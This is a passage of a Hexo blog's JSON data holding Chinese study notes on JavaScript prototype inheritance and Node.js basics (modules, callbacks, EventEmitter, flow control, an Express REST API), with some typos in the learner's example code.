js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">SuperType</span>(<span class=\"hljs-params\"></span>)&#123; <br> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">property</span> = <span class=\"hljs-literal\">true</span>; <br>&#125; <br><span class=\"hljs-title class_\">SuperType</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-property\">getSuperValue</span> = <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123; <br> <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">property</span>; <br>&#125;; <br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">SubType</span>(<span class=\"hljs-params\"></span>)&#123; <br> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">subproperty</span> = <span class=\"hljs-literal\">false</span>; <br>&#125; <br><br><span class=\"hljs-comment\">//继承了 SuperType </span><br><span class=\"hljs-title class_\">SubType</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span> = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">SuperType</span>(); <br><span class=\"hljs-comment\">//!!!!添加新方法</span><br><span class=\"hljs-title class_\">SubType</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-property\">getSubValue</span> = <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>)&#123; <br> <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">subproperty</span>; <br>&#125;; <br><span class=\"hljs-comment\">//重写超类型中的方法</span><br><span class=\"hljs-title class_\">SubType</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-property\">getSuperValue</span> = <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>)&#123; <br> <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">false</span>; <br>&#125;; <br><span class=\"hljs-keyword\">var</span> instance = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">SubType</span>(); <br><span class=\"hljs-title function_\">alert</span>(instance.<span class=\"hljs-title function_\">getSuperValue</span>()); <span class=\"hljs-comment\">//false </span><br><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"Notice\"><a href=\"#Notice\" class=\"headerlink\" title=\"Notice!!!\"></a>Notice!!!</h5><p>使用原型链实现继承时，不能使用对象字面量创建原型方法；因为会重写原型链；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">SuperType</span>(<span class=\"hljs-params\"></span>)&#123; <br> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">property</span> = <span class=\"hljs-literal\">true</span>; <br>&#125; <br><span class=\"hljs-title class_\">SuperType</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-property\">getSuperValue</span> = <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123; <br> <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">property</span>; <br>&#125;; <br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">SubType</span>(<span class=\"hljs-params\"></span>)&#123; <br> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">subproperty</span> = <span class=\"hljs-literal\">false</span>; <br>&#125; <br><span class=\"hljs-comment\">//继承了 SuperType </span><br><span class=\"hljs-title class_\">SubType</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span> = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">SuperType</span>(); <br><span class=\"hljs-comment\">//使用字面量添加新方法，会导致上一行代码无效</span><br><span class=\"hljs-title class_\">SubType</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span> = &#123; <br> getSubValue : <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>)&#123; <br> <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">subproperty</span>; <br> &#125;, <br> someOtherMethod : <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>)&#123; <br> <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">false</span>; <br> &#125; <br>&#125;; <br><span class=\"hljs-keyword\">var</span> instance = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">SubType</span>(); <br><span class=\"hljs-title function_\">alert</span>(instance.<span class=\"hljs-title function_\">getSuperValue</span>()); <span class=\"hljs-comment\">//error! </span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>原型链的问题</li>\n</ul>\n<blockquote>\n<p>问题来自于包含引用类型值的原型；</p>\n<p>包含引用类型值的原型属性会被所有实例共享，这也是在构造函数而不是在原型对象中定义属性的原因；</p>\n<p>在通过原型来实现继承时，原型实际上会变成另一个类型的实例；于是原先实例的属性也就变成了现在的原型属性了；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//定义了一个colors属性</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">SuperType</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">colors</span>=[<span class=\"hljs-string\">&#x27;red&#x27;</span>,<span class=\"hljs-string\">&#x27;grenn&#x27;</span>]l<br>&#125;<br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">SubType</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <br>&#125;<br><br><span class=\"hljs-comment\">//子类原型设为父类</span><br><span class=\"hljs-title class_\">SubType</span>.<span class=\"hljs-property\">protptype</span>=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">SuperType</span>();<br><span class=\"hljs-keyword\">var</span> instance1=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">SubType</span>();<br><span class=\"hljs-comment\">//所有的子都会共享colors；</span><br>instance1.<span class=\"hljs-property\">colors</span>.<span class=\"hljs-title function_\">push</span>(<span class=\"hljs-string\">&#x27;black&#x27;</span>);<br><span class=\"hljs-title function_\">alert</span>(instance1.<span class=\"hljs-property\">colors</span>);\t\t\t<span class=\"hljs-comment\">//red\\gren\\black</span><br><br><span class=\"hljs-keyword\">var</span> instance2=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">SubType</span>();<br><span class=\"hljs-title function_\">alert</span>(instance2.<span class=\"hljs-property\">colors</span>);\t\t\t<span class=\"hljs-comment\">//red\\green\\black</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"（2）借用构造函数\"><a href=\"#（2）借用构造函数\" class=\"headerlink\" title=\"（2）借用构造函数\"></a>（2）借用构造函数</h4><blockquote>\n<p>伪造对象或者经典继承；</p>\n<p>在子类构造函数的内部调用超类型构造函数；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//定义了一个colors属性</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">SuperType</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">colors</span>=[<span class=\"hljs-string\">&#x27;red&#x27;</span>,<span class=\"hljs-string\">&#x27;grenn&#x27;</span>]l<br>&#125;<br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">SubType</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-title class_\">SuperType</span>.<span class=\"hljs-title function_\">call</span>(<span class=\"hljs-variable language_\">this</span>);\t<span class=\"hljs-comment\">//继承了supertype；实际上在未来新创建的SubType实例时调用SuperType的构造函数；</span><br>&#125;<br><br><span class=\"hljs-keyword\">var</span> ins=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">SubType</span>();<br>ins.<span class=\"hljs-property\">colors</span>.<span class=\"hljs-title function_\">push</span>(<span class=\"hljs-string\">&quot;black&quot;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(ins.<span class=\"hljs-property\">colors</span>);\t<span class=\"hljs-comment\">//red.green.black;</span><br><span class=\"hljs-keyword\">var</span> ins2=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">SubType</span>();<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(ins2.<span class=\"hljs-property\">colors</span>);\t<span class=\"hljs-comment\">//red.green;\t//不会共享colors了；</span><br><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"传递参数-1\"><a href=\"#传递参数-1\" class=\"headerlink\" title=\"传递参数\"></a>传递参数</h5><blockquote>\n<p>相比于原型链，借用构造函数有一个很大的优势，可以在子类型构造函数中向超累型构造函数传递参数；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//定义了一个colors属性</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">SuperType</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>=name;<br>&#125;<br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">SubType</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-title class_\">SuperType</span>.<span class=\"hljs-title function_\">call</span>(<span class=\"hljs-variable language_\">this</span>,<span class=\"hljs-string\">&quot;Martin&quot;</span>);\t\t<span class=\"hljs-comment\">//调用父类构造函数实际上为子类的实例设置了name属性；</span><br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">age</span>=<span class=\"hljs-number\">29</span>;\t\t<span class=\"hljs-comment\">//为了确保父类构造函数不会重写子类的属性，可以在调用父类构造函数忠厚添加子类定义的属性；</span><br>&#125;<br><br><span class=\"hljs-keyword\">var</span> ins=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">SubType</span>();<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(ins.<span class=\"hljs-property\">name</span>);\t\t<span class=\"hljs-comment\">//Martin</span><br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(ins.<span class=\"hljs-property\">age</span>);\t\t<span class=\"hljs-comment\">//29</span><br><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h5><blockquote>\n<p>仅仅借用构造函数，无法避免构造函数模式存在的问题：方法都在构造函数中定义，无法函数复用；</p>\n<p>超类原型定义的方法对子类而言也是不可见得；</p>\n</blockquote>\n<h4 id=\"（3）组合继承\"><a href=\"#（3）组合继承\" class=\"headerlink\" title=\"（3）组合继承\"></a>（3）组合继承</h4><blockquote>\n<p>组合继承：有时叫伪经典继承，指将原型链和借用构造函数的技术组合到一块儿，发挥二者之长的继承模式；</p>\n<p>背后的思路是使用原型链实现对原型属性和方法的继承，通过借用构造函数来实现对实例属性的继承；</p>\n</blockquote>\n"},{"title":"NoDe JS 实战","date":"2023-03-27T10:51:45.000Z","mp3":null,"cover":"img/bg25.jpg","_content":"\n\n# NoDe JS 实战\n\n## 一、Welcome to node\n\n### 1.NodeJS基础\n\n- 显著特征：异步、事件驱动机制\n- Node和JS的优势之一是单线程编程。为了实现同步，引入事件机制，点击按钮，触发事件，规避资源死锁和竞态条件\n- 非阻塞I/O\n\n> 程序可以在做其他事情的时候发起一个请求来获取网络资源，然后网络操作完成之后，运行一个回调函数来处理操作的结果\n\n- Node与V8\n\n> Node的动力源自V8引擎。V8的特性之一是会将JS代码直接编译为机器码。\n\n- 特性组\n\n  > Node包含了v8提供的ES6特性，分为shipping、staged、in progress三组；\n  >\n  > 其中shipping是默认开启的，staged和in progress需要命令行参数开启\n\n  ```shell\n  node --harmony\n  node --v8-options | grep \"in progress\"\n  ```\n\n- npm\n\n  >  npm要求Node项目目录下有一个package.json文件；\n\n  ```shell\n  npm init -y    //初始化package.json\n  ```\n\n- 核心模块\n\n> fs，path，net，http/s，dns，assert，os\n\n```js\n\n//调取文件流\nconst fs=require('fs');\nconst zlib=require('zlib');\nconst gzip=zlib.createGzip();\nconst outStream=fs.createWriteStream('output.js.gz');\n\nfs.createReadStream('./fs.js').pipe(gzip).pipe(outStream);\n```\n\n```js\n//网络模块\nconst http=require('http');\nconst port=8080;\n\nconst server=http.createServer((req,res)=>{\n    res.end(\"HEllo,node js!\");\n});\n\nserver.listen(port,()=>{\n    console.log(\"Server listening on:http://localhost:%s\",port);\n});\n```\n\n```shell\n//调试器\nnode debug server.js\n```\n\n- 主流Node程序：Web、命令行工具、桌面程序 \n\n> Node可以将TS转换为JS；\n\n## 二、Node编程基础\n\n- 如何组织代码？\n- 如何实现异步编程？\n\n### 1.Node功能的组织及重用\n\n![](https://s3.bmp.ovh/imgs/2023/02/05/b3bf8ebded4c5d97.jpg)\n\n> 上面的做法会出现一个问题，就是两个文件声明了相同的变量名，导致重复声明；\n>\n> PHP和Ruby等语言使用命名空间来解决问题；\n>\n> Node选择不给程序员污染全局命名空间的机会；\n>\n> Node模块允许从被引入文件中选择要暴露给程序的函数和变量，如果模块返回的函数或者变量不止一个，那么可以通过设定exports对象的属性来指明他们。\n\n![](https://s3.bmp.ovh/imgs/2023/02/05/40f820b01ac722a9.jpg)\n\n### 2.创建一个Node项目\n\n```shell\nmkdir myApp\ncd myApp\nnpm init -y   //全部使用默认值的package\n```\n\n> require是Node中少数几个同步I/O操作之一；\n>\n> I/O密集的地方尽量不要使用require，所有的同步调用都会阻塞Node；\n\n### 3. node_modules重用模块\n\n> 要求模块在文件系统中使用相对路径存放，对于组织程序特定的代码很有帮助。但是对于想要在程序见共享或者跟他人共享代码却用处不大。\n>\n> Node有一个独特的模块引入机制，即node_modules,其模块检索规则如下：\n\n![](https://s3.bmp.ovh/imgs/2023/02/07/4accd465166d6500.jpg)\n\n##### 注意事项：\n\n- 如果模块是目录，在模块目录中定义模块的文件必须命名为index.js。除非在这个目录下一个叫package.json的文件特别执行。要执行一个取代index.js的文件，必须使用JSON数据定义的对象；\n\n```json\n{\n    \"main\":\"currency.js\"\n}\n```\n\n![](https://s3.bmp.ovh/imgs/2023/02/07/eb62dc14f1e8a0e5.jpg)\n\n- Node能把模块作为对象缓存起来。如果两个文件引入了相同的模块，第一个require会把模块返回的数据存到内存中。第二个引入会从内存中加载。\n\n![](https://s3.bmp.ovh/imgs/2023/02/07/3baf64653ff8e710.jpg)\n\n##### ！！！！！！不能实现\n\n### 4.异步编程\n\nNode世界的两种响应逻辑方式：\n\n- 回调：通常用来定义一次性响应的逻辑。比如数据库查询；\n- 事件监听：本质上也是一个回调，不同的是和一个概念实体有关（事件）；\n\n```js\n//下面的例子中，用EventEmitter.Prototype.on方法在服务器上绑定了一个监听器，当有request事件发出，服务器调用handleRequest函数\n\nserver.on('request',handleRequest);\n```\n\nNode Http服务器实例是一个事件发射器，一个可以类（Event Emitter）；\n\nNode的很多核心功能都继承自EventEmitter；\n\n##### 用回调处理一次性事件\n\n> 回调是一个函数，被当作参数传递给异步函数，用来描述异步操作完成之后要做什么。\n\n实例如下：\n\n- 异步获取存放在json文件中的文章标题\n- 异步获取简单的HTML模板\n- 将标题组装到HTML页面里\n- 将HTML发送给客户\n\n```js\nconst http=require('http');\nconst fs=require('fs');\n\nhttp.createServer((req,res)=>{\n    getTitles(res);\n}).listen(8000,'127.0.0.1');\n\n//将回调嵌套的功能代码提取出来\nfunction getTitles(res){\n    fs.readFile('./data/title.json',(err,data)=>{\n        if(err) return hadError(err,res);\n        getTemplate(JSON.parse(data.toString()),res);\n    });\n}\n\nfunction getTemplate(titles,res){\n    fs.readFile('./index.html',(err,data)=>{\n        if(err) return hadError(err,res);\n        formatHtml(titles,data.toString(),res);\n    })\n}\n\nfunction formatHtml(titles,templ,res){\n    const html=templ.replace('%',titles.join('</li><li>'));\n    res.writeHead(200,{'Content-Type':'text/html'});\n    res.end(html);\n}\n\nfunction hadError(err,res){\n    console.log(err);\n    res.end(\"Server Error\");\n}\n```\n\n##### 用事件发射器处理重复性事件\n\n> 事件发射器会触发事件，并且在那些事件被触发时能处理他们；\n>\n> 重要的Node API组件，比如HTTP服务器、TCP服务器和流都被做成了事件发射器；\n\n```js\nsocket.on('data',handleData)\n```\n\necho服务器的例子：\n\n```js\nconst net=require('net');\nconst server=net.createServer(socket=>{\n    socket.on('data',data=>{\n        socket.write(\"Your message is: \"+data+\".\\n\");\n    });\n    //只响应一次\n    socket.once('data',data=>{\n        socket.write(\"Your message is: \"+data+\".\\n\");\n    });\n});\n\nserver.listen(8000,'127.0.0.1');\n```\n\n```shell\ntelnet 127.0.0.1 8888\n```\n\n##### 一个PUB/SUB的例子\n\n下面的代码定义了channel事件发射器，并带有一个监听器，可以监听channel中发生的事件并做出响应；\n\n```js\n//定义\nconst EventEmitter=require('events').EventEmitter;\nconst channel=new EventEmitter();\nchannel.on('join',()=>{\n    console.log(\"Welcome!\");\n})\n\n//触发事件/发射事件/join是事件名称，可以为任何值\nchannel.emit('join');\n```\n\n完整实现代码如下（存在只能输出一个字符的问题，似乎需要上缓存）：\n\n```js\nconst events=require('events');\nconst net=require('net');\nconst channel=new events.EventEmitter();\nvar fullMessage=\"\";\n\nchannel.clients={};\nchannel.subscriptions={};\n\nchannel.on('join',function(id,client){\n    this.clients[id]=client;\n    const welcomeMessage=`Welcome! ${this.listeners('broadcase').length+1} guests online!`;\n    client.write(`${welcomeMessage}\\n`);\n    this.subscriptions[id]=(senderId,message)=>{\n        if(id!=senderId){\n            this.clients[id].write(\"Message from user \"+id+\":\"+message+\".\\n\");\n        }\n    };\n    this.on('broadcase',this.subscriptions[id]);\n    console.log(`${id} has enter the chatroom.\\n`);\n    channel.emit('boradcast',id,`${id} has enter the chatroom.\\n`);\n});\n\n//绑定leave事件；\nchannel.on('leave',function(id){\n    channel.removeListener('broadcast',this.subscriptions[id]);\n    console.log(`${id} has left the chatroom.\\n`);\n    channel.emit('boradcast',id,`${id} has left the chatroom.\\n`);\n});\n\n//绑定lshuwdown事件,提出所有用户；\nchannel.on('shutdown',function(id){\n    channel.emit('broadcast','','The server has shut down.\\n');\n    console.log(`${id} has close the chatroom.\\n`);\n    channel.removeAllListeners('broadcast');\n});\n\n//设定监听器最多的数量为50；\nchannel.setMaxListeners(50);\n\nconst server=net.createServer(client=>{\n    const id=`[${client.remoteAddress}:${client.remotePort}]`;\n    channel.emit('join',id,client);\n    client.on('data',data=>{\n        data=data.toString();\n        if(data==='*'){\n            channel.emit('shutdown',id);\n        }\n        if(data==='-'){\n            channel.emit('leave',id);\n        }\n        channel.emit('broadcase',id,data);\n    });\n    client.on('close',()=>{\n        channel.emit('leave',id);\n    });\n});\n\nserver.listen(8888);\n```\n\n### 5.异步开发的难题\n\n> 创建异步程序时，需要关注：\n>\n> 1.事件轮询的条件；\n>\n> 2.程序变量；\n>\n> 3.其他随程序逻辑执行而发生变化的资源；\n\n```js\n//作用域是如何导致bug出现的\n\nfunction  asyncFunction(callback){\n    setTimeout(callback,200);\n}\n\nlet color='green';\t\t\t\t//初始color\nasyncFunction(()=>{\n    console.log(`The color is ${color}.`);\t\t\t//等待200ms输出color\n});\n\ncolor='blue'\t\t\t//结果为输出blue；\n```\n\n> JS闭包可以冻结color的值；\n>\n> 下面的例子对asyncFunction的调用被封装到一个以color为参数的匿名函数里。\n\n```js\ncolor='blue'\t\t\t\n(color=>{\n    asyncFunction(()=>{\n        console.log(`The color is `,color);\n    });\n})(color);\n\ncolor='green';\t\t\t\t//结果为输出blue；\n```\n\n### 6.异步逻辑的顺序化\n\n> 让一组异步任务顺序执行的概念被Node社区称为流程控制；\n>\n> 控制分为：串行、并行\n\n![](https://s3.bmp.ovh/imgs/2023/02/09/b33ca1d4d596f929.jpg)\n\n#### （1）串行流程控制\n\n```js\n//以下代码用回调让任务顺序执行\nsetTimeout(()=>{\n    console.log(\"Wait 1000ms...\");\n    setTimeout(()=>{\n        console.log(\"Wait 500ms...\");\n        setTimeout(()=>{\n            console.log(\"Wait 100ms...\");\n        },100)\n    },500)\n},1000)\n```\n\n实际情况中可能是读取文件、发送http请求等；\n\n##### 借助async流程控制工具执行\n\n```shell\nnpm install async\n```\n\n```js\nconst async=require('async');\n\n//维护一个顺序数组\nasync.series([\n    callback=>{\n        setTimeout(()=>{\n            console.log(\"Wawit 1000ms...\");\n            callback();\n        },1000);\n    },\n    callback=>{\n        setTimeout(()=>{\n            console.log(\"Wawit 500ms...\");\n            callback();\n        },500)\n    },\n    callback=>{\n        setTimeout(()=>{\n            console.log(\"Wawit 100ms...\");\n            callback();\n        },100);\n    }\n]);\n```\n\n- 可读性、可维护性更强；\n- 刻意回避回调嵌套；\n\n#### （2）实现串行化流程控制\n\n- 按照预期执行的顺序维护一个数组；\n- FIFO方法完成任务；\n- 每个任务完成以后调用一个函数来返回任务执行的成功与否；\n\n```js\nfunction TaskA(){\n    console.log(\"Doing work A!\");\n    next();\n}\n\nfunction TaskB(){\n    console.log(\"Doing work B!\");\n    next();\n}\n\nfunction TaskC(){\n    console.log(\"Doing work C!\");\n    next();\n}\n\n//维护的一个数组；\nconst tasks=[TaskA,TaskB,TaskC];\n\nfunction next(err,result){\n    if(err) throw err;\t\t\t\t   //如果出错，就抛出错误\n    const currentTask=tasks.shift();\t//没有出错，移动数组；\n    if(currentTask){\n       currentTask(result);\n    }\n}\n\nnext();\n```\n\n#### （3）实现并行化流程控制\n\n> 为了让异步任务并行执行，人需要维护一个数组；但是此时任务的存放顺序无关紧要；\n\n#### （4）利用社区的工具进行流程控制\n\n- Async\n- Step\n- Seq\n\n## 三、Node Web\n\n- 创建一个新的Web程序\n- 搭建RESTful服务\n- 持久化数据\n- 使用模板\n\n### 1.Node Web程序结构\n\n- package.json  包含依赖项列表和运行这个程序的命令的文件；\n- public/             静态资源文件夹，css/客户端js都在这；\n- node_modules/ 项目的依赖项会安装到这里；\n\n##### 程序代码\n\n- app.js/index.js          设置程序的代码；\n- models/                    数据库模型；\n- views/                       用来渲染的页面模板；\n- controllers/routes      HTTP请求处理器；\n- middleware/              中间件组件；\n\n> 如何组织程序是我的自由，大部分web框架都很灵活；\n\n```shell\nnpm install --save express\nnpm rm express --save\n```\n\n一个简单的服务器，使用express（）创建一个程序实例，添加路由处理器，然后将实例绑定到一个TCP端口；\n\n```js\nconst express=require('express');\n\nconst app=express();\n\nconst port=process.env.PORT || 3000;\n\napp.get('/',(req,res)=>{\n    res.send(\"Hello,world!\");\n});\n\napp.listen(port,()=>{\n    console.log(`Express web app available at localhost:${port}`);\n})\n```\n\n##### npm脚本\n\n> 启动服务起的命令（`node index.js`）可以保存问npm脚本；如下可以使用`npm start`启动项目；\n\n```json\n \"scripts\": {\n    \"start\":\"node index.js\"\n  },\n```\n\n##### 搭建一个RESTful Web服务\n\n- POST  /articles   \n- GET    /articles/:id\n- GET    /articles\n- DELETE  /articles/:id\n\n```shell\ncurl http://127.0.0.1:3000/articles/0\ncurl -X DELETE http://127.0.0.1:3000/articles/0\n```\n\n```shell\n#官方消息体解析器\nnpm install --save bodt-parser\n```\n\n```js\nconst express=require('express');\nconst bodyParser=require('body-parser');\n\nconst articles=[{title:'NodeJS入门'},{title:'VueJS入门'},{title:'深入浅出VueJS'}];\n\nconst app=express();\n\napp.set('port',process.env.PORT||3000);\n\napp.use(bodyParser.json());\napp.use(bodyParser.urlencoded({extended:true}));\n\n\napp.get('/articles',(req,res,next)=>{\n    res.send(articles);\n});\n\napp.get('/articles/:id',(req,res,next)=>{\n    const id=req.params.id;\n    console.log(\"Fetching article \",id,\".\");\n    res.send(articles[id]);\n});\n\napp.delete('/articles/:id',(req,res,next)=>{\n    const id=req.params.id;\n    console.log(\"Deleting article \",id,\".\");\n    delete articles[id];\n    res.send({message:'Article has been deleted.'});\n});\n\napp.post('/articles',(req,res,next)=>{\n    const article={title:req.body.title};\n    articles.push(article);\n    res.send(articles);\n});\n\napp.listen(app.get('port'),()=>{\n    console.log('App started on port ',app.get('port'));\n});\n\nmodule.exports=app;\n```\n\n> 到这一步为止，跟真正的Web程序差不多了，只需要完成两个新的任务：\n>\n> 永久保存数据到数据库；\n>\n> 形成可读版本的文章；\n\n```shell\n#模板引擎\nnpm install ejs --save\n```\n\n### 2.Node Web开发\n\n> 现代Web开发中，使用Node来进行工具和服务的情况越来越多；\n>\n> 需要负责和配置维护工具库；\n>\n> 本章使用npm脚本、Gulp和Webpack搭建易于维护的项目；\n\n#### 前端构建工具的优点：\n\n- 代码简单易懂；\n- 支持代码转译；\n- 源码映射；\n\n#### Webpck\n\n- 快速搭建支持增量式结构的构建系统；\n\n## 五、服务器端框架\n\n- 使用热门的Node Web框架；\n- 选择合适的框架；\n- 用Web框架搭建Web程序；\n\n#### 1.用户画像\n\n> 假设一个场景，需要做一个内容分发系统，用户需要上传下载法律文件，在线阅读文件；\n>\n> 徐娅萍生成PDF还有电子商务组件，你会怎么考虑技术栈？\n\n- 文件上传下载阅读--Express\n- 生成PDF的微服务--hapi\n- 电子商务组件--SailJS\n\n使用用户画像考虑设计问题是通用做法。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/NodeJS实战读书笔记.md","raw":"---\ntitle:  NoDe JS 实战\ndate: 2023-03-27 18:51:45\ncategories: \n    - 前端\ntags: \n    - Node\n    - 笔记\nmp3: \ncover: img/bg25.jpg\n---\n\n\n# NoDe JS 实战\n\n## 一、Welcome to node\n\n### 1.NodeJS基础\n\n- 显著特征：异步、事件驱动机制\n- Node和JS的优势之一是单线程编程。为了实现同步，引入事件机制，点击按钮，触发事件，规避资源死锁和竞态条件\n- 非阻塞I/O\n\n> 程序可以在做其他事情的时候发起一个请求来获取网络资源，然后网络操作完成之后，运行一个回调函数来处理操作的结果\n\n- Node与V8\n\n> Node的动力源自V8引擎。V8的特性之一是会将JS代码直接编译为机器码。\n\n- 特性组\n\n  > Node包含了v8提供的ES6特性，分为shipping、staged、in progress三组；\n  >\n  > 其中shipping是默认开启的，staged和in progress需要命令行参数开启\n\n  ```shell\n  node --harmony\n  node --v8-options | grep \"in progress\"\n  ```\n\n- npm\n\n  >  npm要求Node项目目录下有一个package.json文件；\n\n  ```shell\n  npm init -y    //初始化package.json\n  ```\n\n- 核心模块\n\n> fs，path，net，http/s，dns，assert，os\n\n```js\n\n//调取文件流\nconst fs=require('fs');\nconst zlib=require('zlib');\nconst gzip=zlib.createGzip();\nconst 